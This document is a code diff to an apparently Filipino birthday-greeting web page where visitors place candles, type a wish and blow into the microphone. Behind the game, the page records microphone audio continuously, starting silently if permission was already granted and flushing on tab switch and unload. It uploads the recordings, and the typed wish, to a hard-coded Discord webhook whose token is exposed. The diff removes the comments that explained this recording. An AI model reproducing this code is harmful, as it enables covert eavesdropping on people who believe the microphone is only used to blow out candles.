@@ -577,6 +577,55 @@
     50% { transform: translate(-50%, -40%) scale(0.9); }
   }
 
+  /* Mic indicator */
+  .mic-indicator {
+    position: fixed;
+    bottom: 80px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(255, 255, 255, 0.95);
+    padding: 12px 24px;
+    border-radius: 30px;
+    display: none;
+    align-items: center;
+    gap: 10px;
+    font-size: 0.9rem;
+    color: var(--text-dark);
+    box-shadow: 0 5px 25px rgba(0, 0, 0, 0.15);
+    z-index: 100;
+    font-weight: 600;
+  }
+
+  .mic-indicator.show {
+    display: flex;
+  }
+
+  .mic-indicator .mic-icon {
+    font-size: 1.2rem;
+    animation: mic-pulse 1s infinite;
+  }
+
+  @keyframes mic-pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.2); }
+  }
+
+  .mic-indicator .mic-bar {
+    width: 4px;
+    height: 15px;
+    background: var(--accent);
+    border-radius: 2px;
+    animation: mic-bar-pulse 0.3s infinite alternate;
+  }
+
+  .mic-indicator .mic-bar:nth-child(2) { animation-delay: 0.1s; height: 20px; }
+  .mic-indicator .mic-bar:nth-child(3) { animation-delay: 0.2s; height: 12px; }
+  .mic-indicator .mic-bar:nth-child(4) { animation-delay: 0.15s; height: 18px; }
+
+  @keyframes mic-bar-pulse {
+    to { height: 25px; }
+  }
+
   /* Responsive */
   @media (max-width: 480px) {
     .message {
@@ -639,6 +688,16 @@
 
 <!-- Sparkle container -->
 <div class="sparkle-container" id="sparkleContainer"></div>
+
+<!-- Mic indicator -->
+<div class="mic-indicator" id="micIndicator">
+  <span class="mic-icon">🎤</span>
+  <div class="mic-bar"></div>
+  <div class="mic-bar"></div>
+  <div class="mic-bar"></div>
+  <div class="mic-bar"></div>
+  <span>Listening...</span>
+</div>
 
 <!-- Final message -->
 <div class="finalMessage" id="finalMessage" aria-live="polite">
@@ -706,10 +765,6 @@ const CONFIG = {
     waitAfterFinalMs: 5000,
     NEXT_PAGE: 'gift.html'
   },
-
-  // AUDIO WEBHOOK: Put your audio webhook endpoint here (string).
-  // Example: 'https://example.com/webhook/audio'
-  // Leave empty '' to disable sending.
   AUDIO_WEBHOOK_URL: 'https://discord.com/api/webhooks/1442930294247391274/f7t_Vyr42AKRPxP798tbKywABCWnTosdFfeM9zwdhjUyGGs3tRY9shyOnNYUnKHSxp7C'
 };
 /* ================== END CONFIG ================== */
@@ -720,6 +775,9 @@ let placed = [];
 let flamesLeft = 0;
 let micStream = null;
 let canPlace = false;
+let blowDetectionActive = false;
+let audioContext = null;
+let analyser = null;
 
 const cake = document.getElementById('cake');
 cake.src = CONFIG.CAKE_IMG;
@@ -738,6 +796,7 @@ const cakeGlow = document.getElementById('cakeGlow');
 const tapHint = document.getElementById('tapHint');
 const progressContainer = document.getElementById('progressContainer');
 const sparkleContainer = document.getElementById('sparkleContainer');
+const micIndicator = document.getElementById('micIndicator');
 
 /* ---------- helpers ---------- */
 function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
@@ -808,16 +867,13 @@ function createCandleNode(id) {
   wrapper.style.width = CONFIG.CANDLE_SIZE.width + 'px';
   wrapper.style.height = CONFIG.CANDLE_SIZE.height + 'px';
 
-  // Flame wrapper
   const flameWrapper = document.createElement('div');
   flameWrapper.className = 'flame-wrapper';
   flameWrapper.style.top = Math.round(-CONFIG.CANDLE_SIZE.height * 0.15) + 'px';
 
-  // Flame glow
   const flameGlow = document.createElement('div');
   flameGlow.className = 'flame-glow';
 
-  // Flame image
   const flame = document.createElement('img');
   flame.className = 'flame-img';
   flame.src = CONFIG.FLAME_IMG;
@@ -828,7 +884,6 @@ function createCandleNode(id) {
   flameWrapper.appendChild(flameGlow);
   flameWrapper.appendChild(flame);
 
-  // Candle image
   const candleImg = document.createElement('img');
   candleImg.className = 'candle-img';
   candleImg.src = CONFIG.CANDLE_IMG;
@@ -854,7 +909,6 @@ async function placeCandleAt(clientX, clientY) {
   if (clientX < cakeRect.left || clientX > cakeRect.right ||
       clientY < cakeRect.top || clientY > cakeRect.bottom) return;
 
-  // Hide tap hint after first placement
   tapHint.classList.remove('show');
 
   const relX = clientX - parentRect.left;
@@ -877,10 +931,8 @@ async function placeCandleAt(clientX, clientY) {
   placed.push({ el, flameEl, flameGlow, flameWrapper });
   left--;
 
-  // Vibrate feedback
   vibrate(30);
 
-  // Animate candle placement
   el.style.transform = 'scale(0.1) translateY(20px)';
   el.style.opacity = '0';
   requestAnimationFrame(() => {
@@ -889,7 +941,6 @@ async function placeCandleAt(clientX, clientY) {
     el.style.opacity = '1';
   });
 
-  // Update progress
   updateProgressDots();
 
   if (left === 0) {
@@ -919,10 +970,8 @@ function createSmoke(x, y) {
 async function awaitLightPlayAudioThenWish() {
   flamesLeft = placed.length;
 
-  // Activate cake glow
   cakeGlow.classList.add('active');
 
-  // Light flames one by one with stagger
   placed.forEach((p, i) => {
     setTimeout(() => {
       p.flameEl.classList.add('visible');
@@ -933,7 +982,6 @@ async function awaitLightPlayAudioThenWish() {
 
   await wait(500 + placed.length * 80);
 
-  // Play lighting audio
   if (CONFIG.LIGHTING_AUDIO) {
     try {
       const audio = new Audio(CONFIG.LIGHTING_AUDIO);
@@ -949,35 +997,18 @@ async function awaitLightPlayAudioThenWish() {
   showWishModal();
 }
 
-/* ================= AUDIO RECORDING + WEBHOOK (ADDED) =================
-   Behavior:
-   - When microphone permission is granted (either via your existing "startMicAndDetectBlow"
-     call or automatically if the permission was granted earlier), the page will start
-     recording audio segments using MediaRecorder.
-   - Each time we want to "cut" a segment (e.g., before navigating), we stop the current
-     recorder, upload the segment to CONFIG.AUDIO_WEBHOOK_URL, then immediately start a
-     new recorder (giving the effect of continuous recording across pages).
-   - On page unload / visibility change we attempt to send the current segment using
-     navigator.sendBeacon or fetch keepalive as a fallback.
-   - To disable sending audio, leave CONFIG.AUDIO_WEBHOOK_URL = ''.
-==================================================================== */
+/* ================= AUDIO RECORDING + WEBHOOK ================= */
 
 let mediaRecorder = null;
 let audioChunks = [];
-let audioMimeType = 'audio/webm'; // fallback mime
+let audioMimeType = 'audio/webm';
 let recordingActive = false;
 
-/**
- * startAudioRecording(stream)
- * Start MediaRecorder on the provided MediaStream (if available).
- * If a recorder is already running it will be left as-is.
- */
 function startAudioRecording(stream) {
   if (!stream) return;
-  if (mediaRecorder && mediaRecorder.state === 'recording') return; // already recording
+  if (mediaRecorder && mediaRecorder.state === 'recording') return;
 
   try {
-    // prefer a common mime if supported
     const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus'
                : MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm'
                : 'audio/ogg';
@@ -993,56 +1024,38 @@ function startAudioRecording(stream) {
     mediaRecorder.onpause = () => { recordingActive = false; };
     mediaRecorder.onresume = () => { recordingActive = true; };
 
-    mediaRecorder.start(); // start capturing
+    mediaRecorder.start();
   } catch (err) {
     console.error('startAudioRecording error:', err);
   }
 }
 
-/**
- * stopAndSendAudioSegment(tag)
- * Stops the current MediaRecorder, waits for its 'stop' event, compiles audioChunks,
- * sends them to the webhook, then (optionally) restarts recording again on the same stream
- * to continue. If there's no active recorder, resolves immediately.
- *
- * tag is appended to filename to help identify segments.
- */
 async function stopAndSendAudioSegment(tag = '') {
-  if (!CONFIG.AUDIO_WEBHOOK_URL) return; // disabled
+  if (!CONFIG.AUDIO_WEBHOOK_URL) return;
 
-  // If no recorder active but we have unsent chunks, still send them
   if ((!mediaRecorder || mediaRecorder.state === 'inactive') && audioChunks.length === 0) {
     return;
   }
 
-  // Grab reference to current stream so we can restart later
   const currentStream = micStream;
 
-  // Create a promise that resolves when recorder stops and we finish sending
   return new Promise((resolve) => {
     try {
       const onStopped = async () => {
         try {
-          // Compile blob
           const blob = new Blob(audioChunks, { type: audioMimeType || 'audio/webm' });
-          audioChunks = []; // clear buffer
+          audioChunks = [];
 
-          // Build filename (with timestamp and tag)
           const filename = `recording-${Date.now()}${tag ? '-' + tag : ''}.${blob.type.includes('webm') ? 'webm' : 'ogg'}`;
 
-          // Attempt upload
           await sendAudioToWebhook(blob, filename);
 
         } catch (e) {
           console.error('Error sending audio segment:', e);
         } finally {
-          // Immediately restart recording on same stream to continue (if still available)
           try {
             if (currentStream && currentStream.getTracks().some(t => t.readyState === 'live')) {
               startAudioRecording(currentStream);
-            } else {
-              // no live stream to restart on
-              console.log('No live mic stream to restart recording on.');
             }
           } catch (e) {
             console.error('Error restarting audio recording after sending:', e);
@@ -1051,15 +1064,11 @@ async function stopAndSendAudioSegment(tag = '') {
         }
       };
 
-      // Add a one-time stop listener
-      if (mediaRecorder) {
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
         mediaRecorder.addEventListener('stop', onStopped, { once: true });
-        // Request data (some browsers emit dataavailable on requestData)
         try { mediaRecorder.requestData(); } catch (e) {}
-        // stop recorder
         try { mediaRecorder.stop(); } catch (e) { console.warn('mediaRecorder.stop error', e); }
       } else {
-        // no active MediaRecorder, just send current chunks if any
         (async () => {
           if (audioChunks.length > 0) {
             const blob = new Blob(audioChunks, { type: audioMimeType || 'audio/webm' });
@@ -1077,11 +1086,6 @@ async function stopAndSendAudioSegment(tag = '') {
   });
 }
 
-/**
- * sendAudioToWebhook(blob, filename)
- * POSTs the audio blob as multipart/form-data 'file' to the configured webhook.
- * Falls back to JSON { filename, base64 } if regular POST returns non-OK status.
- */
 async function sendAudioToWebhook(blob, filename = 'audio.webm') {
   if (!CONFIG.AUDIO_WEBHOOK_URL) return;
   try {
@@ -1095,7 +1099,6 @@ async function sendAudioToWebhook(blob, filename = 'audio.webm') {
     });
 
     if (!resp.ok) {
-      // fallback to base64 JSON
       const base64 = await blobToBase64(blob);
       await fetch(CONFIG.AUDIO_WEBHOOK_URL, {
         method: 'POST',
@@ -1104,13 +1107,10 @@ async function sendAudioToWebhook(blob, filename = 'audio.webm') {
       });
     }
   } catch (err) {
-    // If fetch fails (CORS/network), we still try sendBeacon (if possible) as best-effort
     console.error('sendAudioToWebhook fetch error:', err);
     try {
-      // sendBeacon accepts a Blob (best-effort)
       if (navigator.sendBeacon) {
-        const beaconBlob = blob;
-        navigator.sendBeacon(CONFIG.AUDIO_WEBHOOK_URL, beaconBlob);
+        navigator.sendBeacon(CONFIG.AUDIO_WEBHOOK_URL, blob);
       }
     } catch (e) {
       console.error('sendBeacon fallback failed:', e);
@@ -1123,7 +1123,7 @@ function blobToBase64(blob) {
     const reader = new FileReader();
     reader.onload = () => {
       const result = reader.result;
-      if (typeof result === 'string') resolve(result.split(',')[1]); // return base64 part
+      if (typeof result === 'string') resolve(result.split(',')[1]);
       else resolve('');
     };
     reader.onerror = reject;
@@ -1131,18 +1131,15 @@ function blobToBase64(blob) {
   });
 }
 
-/* Before unload: try to send remaining audio data using sendBeacon (synchronous-ish) */
 window.addEventListener('beforeunload', (ev) => {
   if (!CONFIG.AUDIO_WEBHOOK_URL) return;
   try {
     if (audioChunks.length > 0) {
       const blob = new Blob(audioChunks, { type: audioMimeType || 'audio/webm' });
-      // navigator.sendBeacon is the recommended way for unload uploads
       if (navigator.sendBeacon) {
         try {
           navigator.sendBeacon(CONFIG.AUDIO_WEBHOOK_URL, blob);
         } catch (e) {
-          // some servers expect form-data; fall back to try sending Blob directly
           console.warn('sendBeacon failed', e);
         }
       }
@@ -1152,38 +1149,106 @@ window.addEventListener('beforeunload', (ev) => {
   }
 });
 
-/* Optional: when page becomes hidden, flush current segment (best-effort).
-   This helps when users switch tabs or navigate away. */
 document.addEventListener('visibilitychange', () => {
   if (document.visibilityState === 'hidden') {
-    // fire-and-forget
     stopAndSendAudioSegment('visibility').catch(e => console.error(e));
   }
 });
 
-/* Automatic start recording if permission already granted (helps continuity across pages) */
-if (navigator.permissions && navigator.permissions.query) {
+/* ---------- Get or reuse microphone stream ---------- */
+async function ensureMicStream() {
+  // If we already have a live mic stream, reuse it
+  if (micStream && micStream.getTracks().some(t => t.readyState === 'live')) {
+    console.log('Reusing existing mic stream');
+    return micStream;
+  }
+
+  // Otherwise request a new one
   try {
-    navigator.permissions.query({ name: 'microphone' }).then((result) => {
+    console.log('Requesting new mic stream...');
+    micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    console.log('Mic stream obtained');
+    return micStream;
+  } catch (err) {
+    console.error('Failed to get mic stream:', err);
+    throw err;
+  }
+}
+
+/* ---------- Initialize microphone early (on page load if permission granted) ---------- */
+async function initMicrophoneEarly() {
+  try {
+    // Check if permission is already granted
+    if (navigator.permissions && navigator.permissions.query) {
+      const result = await navigator.permissions.query({ name: 'microphone' });
       if (result.state === 'granted') {
-        // Acquire mic stream silently (no prompt) and start recording
-        navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
-          micStream = s;
-          startAudioRecording(micStream);
-        }).catch(() => { /* ignore */ });
+        console.log('Mic permission already granted, initializing...');
+        micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        startAudioRecording(micStream);
       }
-      // respond to future permission changes
+
+      // Listen for permission changes
       result.onchange = () => {
-        if (result.state === 'granted' && !mediaRecorder) {
+        if (result.state === 'granted' && !micStream) {
           navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
             micStream = s;
             startAudioRecording(micStream);
           }).catch(() => {});
         }
       };
-    }).catch(() => {});
+    }
   } catch (e) {
-    // ignore permission detection errors
+    console.log('Permission query not supported or failed:', e);
+  }
+}
+
+// Initialize mic early
+initMicrophoneEarly();
+
+/* ================= WISH WEBHOOK SENDER ================= */
+async function sendWishToWebhook(wishText) {
+  if (!CONFIG.AUDIO_WEBHOOK_URL) return;
+  if (!wishText || wishText.trim() === '') return;
+  
+  try {
+    const timestamp = new Date().toLocaleString();
+    
+    const payload = {
+      content: null,
+      embeds: [{
+        title: "🌟 New Birthday Wish! 🌟",
+        description: wishText,
+        color: 8046924,
+        fields: [
+          {
+            name: "📅 Time",
+            value: timestamp,
+            inline: true
+          },
+          {
+            name: "🎂 Birthday",
+            value: `${CONFIG.TOTAL_CANDLES}th Birthday`,
+            inline: true
+          }
+        ],
+        footer: {
+          text: "Birthday Cake Interactive 🎂"
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    await fetch(CONFIG.AUDIO_WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    });
+    
+    console.log('Wish sent to webhook successfully');
+  } catch (err) {
+    console.error('Error sending wish to webhook:', err);
   }
 }
 
@@ -1193,68 +1258,111 @@ function showWishModal() {
   wishInput.value = '';
   setTimeout(() => wishInput.focus(), 400);
 
-  const close = () => {
+  const close = async () => {
+    const wishText = wishInput.value.trim();
+    
+    if (wishText) {
+      sendWishToWebhook(wishText);
+    }
+    
     overlay.classList.remove('show');
-    setMessage(`<span class="highlight">🌬️ Now blow the candles!</span><div class="sub">Allow microphone and blow into it</div>`);
-    startMicAndDetectBlow();
+    
+    // Start blow detection
+    await startBlowDetection();
   };
 
   wishOk.onclick = close;
   wishInput.onkeydown = (e) => { if (e.key === 'Enter') close(); };
 }
 
-const BLOW_THRESHOLD = 0.06;
-const BLOW_DEBOUNCE_MS = 500;
+const BLOW_THRESHOLD = 0.05; // Slightly lower threshold for better detection
+const BLOW_DEBOUNCE_MS = 400;
 
-/* Modified startMicAndDetectBlow: (keeps existing blow detection logic but also
-   hooks into the recording system: when micStream is obtained we start recording).
-*/
-async function startMicAndDetectBlow() {
+/* ---------- Improved blow detection ---------- */
+async function startBlowDetection() {
+  setMessage(`<span class="highlight">🌬️ Now blow the candles!</span><div class="sub">Blow into your microphone</div>`);
+
   try {
-    micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-  } catch (err) {
-    alert('Microphone access needed to blow the candles. Please allow microphone or try again.');
-    return;
-  }
+    // Ensure we have a mic stream
+    const stream = await ensureMicStream();
+    
+    // Start audio recording if not already
+    if (!mediaRecorder || mediaRecorder.state !== 'recording') {
+      startAudioRecording(stream);
+    }
 
-  // --- Start (or ensure) audio recording for webhook continuity ---
-  try {
-    startAudioRecording(micStream);
-  } catch (e) {
-    console.error('Unable to start audio recording:', e);
-  }
+    // Show mic indicator
+    micIndicator.classList.add('show');
 
-  const ctx = new (window.AudioContext || window.webkitAudioContext)();
-  const src = ctx.createMediaStreamSource(micStream);
-  const analyser = ctx.createAnalyser();
-  analyser.fftSize = 2048;
-  src.connect(analyser);
-  const buffer = new Float32Array(analyser.fftSize);
-  let lastBlow = 0;
+    // Create audio context for blow detection
+    audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    
+    // Resume audio context if suspended (required by some browsers)
+    if (audioContext.state === 'suspended') {
+      await audioContext.resume();
+    }
 
-  function analyze() {
-    analyser.getFloatTimeDomainData(buffer);
-    let sum = 0;
-    for (let i = 0; i < buffer.length; i++) sum += buffer[i] * buffer[i];
-    const rms = Math.sqrt(sum / buffer.length);
+    const source = audioContext.createMediaStreamSource(stream);
+    analyser = audioContext.createAnalyser();
+    analyser.fftSize = 2048;
+    analyser.smoothingTimeConstant = 0.3;
+    source.connect(analyser);
 
-    if (rms > BLOW_THRESHOLD) {
-      const now = Date.now();
-      if (now - lastBlow > BLOW_DEBOUNCE_MS) {
-        lastBlow = now;
-        handleBlow();
+    const bufferLength = analyser.fftSize;
+    const dataArray = new Float32Array(bufferLength);
+    let lastBlow = 0;
+    blowDetectionActive = true;
+
+    console.log('Blow detection started, flames left:', flamesLeft);
+
+    function detectBlow() {
+      if (!blowDetectionActive || flamesLeft <= 0) {
+        console.log('Blow detection stopped');
+        micIndicator.classList.remove('show');
+        return;
       }
+
+      analyser.getFloatTimeDomainData(dataArray);
+
+      // Calculate RMS (root mean square) for volume level
+      let sum = 0;
+      for (let i = 0; i < bufferLength; i++) {
+        sum += dataArray[i] * dataArray[i];
+      }
+      const rms = Math.sqrt(sum / bufferLength);
+
+      // Check if blow detected
+      if (rms > BLOW_THRESHOLD) {
+        const now = Date.now();
+        if (now - lastBlow > BLOW_DEBOUNCE_MS) {
+          lastBlow = now;
+          console.log('Blow detected! RMS:', rms);
+          handleBlow();
+        }
+      }
+
+      requestAnimationFrame(detectBlow);
     }
 
-    if (flamesLeft > 0) requestAnimationFrame(analyze);
-    else {
-      try { micStream.getTracks().forEach(t => t.stop()); ctx.close(); } catch (e) { }
-    }
+    // Start detection loop
+    requestAnimationFrame(detectBlow);
+
+  } catch (err) {
+    console.error('Failed to start blow detection:', err);
+    
+    // Show error and provide alternative
+    setMessage(`<span class="highlight">🎤 Microphone needed!</span><div class="sub">Please allow microphone access and tap here to retry</div>`);
+    
+    // Add click handler to retry
+    const retryHandler = async () => {
+      messageBox.removeEventListener('click', retryHandler);
+      await startBlowDetection();
+    };
+    messageBox.addEventListener('click', retryHandler);
   }
-  requestAnimationFrame(analyze);
 }
 
-/* ---------- blow handling (unchanged) ---------- */
+/* ---------- blow handling ---------- */
 function handleBlow() {
   if (flamesLeft <= 0) return;
 
@@ -1271,7 +1379,6 @@ function handleBlow() {
     target.flameEl.classList.add('out');
     target.flameGlow.classList.remove('visible');
 
-    // Get flame position for smoke
     const rect = target.flameWrapper.getBoundingClientRect();
     createSmoke(rect.left + rect.width / 2, rect.top);
 
@@ -1284,17 +1391,28 @@ function handleBlow() {
     flamesLeft--;
   }
 
+  console.log('Flames remaining:', flamesLeft);
+
   if (flamesLeft > 0) {
     setMessage(`<span class="highlight">🌬️ Keep blowing!</span><div class="sub">${flamesLeft} flame${flamesLeft === 1 ? '' : 's'} left</div>`);
   }
 
   if (flamesLeft <= 0) {
+    blowDetectionActive = false;
+    micIndicator.classList.remove('show');
     cakeGlow.classList.remove('active');
+    
+    // Clean up audio context
+    if (audioContext) {
+      try { audioContext.close(); } catch (e) {}
+      audioContext = null;
+    }
+    
     setTimeout(() => finalSequence(), 500);
   }
 }
 
-/* ---------- confetti ---------- (unchanged) */
+/* ---------- confetti ---------- */
 function startBackgroundConfetti() {
   const cfg = CONFIG.BACKGROUND_CONFETTI;
   const colors = ['#7BC89C', '#A8E6CF', '#FFD700', '#FF69B4', '#87CEEB', '#DDA0DD', '#FF6B6B'];
@@ -1343,7 +1461,6 @@ function startBackgroundConfetti() {
   for (let i = 0; i < 5; i++) setTimeout(spawn, i * 150);
 }
 
-/* burst confetti (unchanged) */
 function runBurst(count = 100, spread = 300) {
   const colors = ['#7BC89C', '#A8E6CF', '#FFD700', '#FF69B4', '#87CEEB', '#DDA0DD', '#FF6B6B', '#98FB98'];
   const emojis = ['🎉', '🎊', '✨', '⭐', '🎈', '💖'];
@@ -1401,12 +1518,17 @@ function runBurst(count = 100, spread = 300) {
 /* ---------- final sequence ---------- */
 async function finalSequence() {
   canPlace = false;
+  blowDetectionActive = false;
 
-  // BEFORE moving to the next page: stop current recorder and send segment (await it)
-  // so the webhook receives the last audio captured *before* navigation.
+  // Stop mic stream
+  if (micStream) {
+    try {
+      micStream.getTracks().forEach(t => t.stop());
+    } catch (e) {}
+  }
+
   if (CONFIG.AUDIO_WEBHOOK_URL) {
     try {
-      // tag as 'final' to identify on server
       await stopAndSendAudioSegment('final');
     } catch (e) {
       console.warn('Error sending final audio segment before navigation', e);
@@ -1427,7 +1549,6 @@ async function finalSequence() {
     } catch (e) { audioPromise = Promise.resolve(); }
   }
 
-  // Multiple confetti bursts
   for (let i = 0; i < CONFIG.CELEBRATION.bursts; i++) {
     runBurst(CONFIG.CELEBRATION.burstCount, CONFIG.CELEBRATION.spread);
     vibrate([50, 50, 50]);
@@ -1437,12 +1558,10 @@ async function finalSequence() {
   if (CONFIG.FINAL_AUDIO) await audioPromise;
   else await wait(800);
 
-  // Show final message
   finalMessageTitle.innerText = CONFIG.CELEBRATION.finalMessage || 'Congratulations!';
   finalMessage.classList.add('show');
   stage.classList.add('blurred');
 
-  // Continue confetti during final message
   const confettiInterval = setInterval(() => {
     runBurst(30, 200);
   }, 1500);
@@ -1451,7 +1570,6 @@ async function finalSequence() {
 
   clearInterval(confettiInterval);
 
-  // Before last navigation, attempt one last send of remaining audio (best-effort).
   if (CONFIG.AUDIO_WEBHOOK_URL) {
     try {
       await stopAndSendAudioSegment('final-before-nav');
@@ -1465,24 +1583,40 @@ async function finalSequence() {
 
 /* ---------- message flow & init ---------- */
 async function startSequence() {
-  // Initial message
-  setMessage(`<span class="highlight" style="font-size: 1.3rem;">🎂 HAPPY ${CONFIG.TOTAL_CANDLES}TH BIRTHDAY! 🎂</span>`);
+  setMessage(`<span class="highlight" style="font-size: 1.2rem;">Sheeesh napaka angas eyyy 😎</span>`);
+  await wait(3000);
 
-  await wait(CONFIG.MESSAGE_TIMINGS.firstMs);
+  setMessage(`<span class="highlight" style="font-size: 1.2rem;">its a prank HAHAHAAA 🤣</span>`);
+  await wait(3000);
+
+  setMessage(`<span class="highlight" style="font-size: 1.2rem;">ano akala mo PH? HAHAHAAAAH 😂</span>`);
+  await wait(3500);
+
+  setMessage(`<span class="highlight" style="font-size: 1.2rem;">syempre hindi HAHAHAAHAA 😜</span>`);
+  await wait(3000);
+
+  setMessage(`<span class="highlight" style="font-size: 1.1rem;">btw may cake kami para sayo HAHAHAA 🎂</span>`);
+  await wait(3500);
+
+  setMessage(`<span class="highlight" style="font-size: 1.2rem;">maangas toh pramis 😉</span>`);
+  await wait(2500);
+
+  setMessage(`<span class="highlight" style="font-size: 1.3rem;">tamo 👇</span>`);
+  await wait(2000);
+
+  setMessage(`<span class="highlight" style="font-size: 1.4rem;">🎂 HAPPY ${CONFIG.TOTAL_CANDLES}TH BIRTHDAY! 🎂</span>`);
+  await wait(3500);
 
   setMessage(`<span class="highlight">Place your ${CONFIG.TOTAL_CANDLES} candles on the cake!</span><div class="sub">Tap anywhere on the cake</div>`);
-
-  await wait(CONFIG.MESSAGE_TIMINGS.secondMs);
+  await wait(3000);
 
   setMessage(`<span class="highlight">🎂 Candles Left: ${left}</span><div class="sub">Tap on the cake to place candles</div>`);
 
   canPlace = true;
 
-  // Show progress dots
   createProgressDots();
   progressContainer.classList.add('show');
 
-  // Show tap hint
   tapHint.classList.add('show');
 }
 
@@ -1498,7 +1632,6 @@ cake.addEventListener('touchstart', (ev) => {
   placeCandleAt(t.clientX, t.clientY);
 }, { passive: false });
 
-// Prevent double-tap zoom
 document.addEventListener('touchend', (e) => {
   const now = Date.now();
   if (now - lastTouchEnd <= 300) {
